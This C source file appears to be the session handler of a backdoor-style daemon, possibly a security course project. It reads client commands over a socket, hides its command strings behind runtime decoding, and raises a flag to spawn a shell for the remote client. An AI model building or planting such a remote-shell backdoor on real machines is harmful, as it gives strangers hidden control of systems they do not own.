#include "ft_shield.h"

int	session_step(t_client *c)
{
	char	line[MAX_LINE + 1];
	char	s[STRENC_MAX + 1];
	ssize_t	n;

	n = read_line(c->fd, line, MAX_LINE);
	if (n <= 0)
		return (-1);
	if (strcmp(line, str_dec(STR_Q, s)) == 0)
	{
		send_str(c->fd, str_dec(STR_HELP_Q, s));
		send_str(c->fd, str_dec(STR_HELP_SH, s));
		send_str(c->fd, str_dec(STR_HELP_EXIT, s));
		return (0);
	}
	if (strcmp(line, str_dec(STR_SHELL, s)) == 0)
	{
		g_pending_shell = 1;
		send_str(c->fd, str_dec(STR_SPAWNING, s));
		return (-1);
	}
	if (strcmp(line, str_dec(STR_EXIT, s)) == 0)
		return (-1);
	send_str(c->fd, str_dec(STR_PROMPT, s));
	return (0);
}
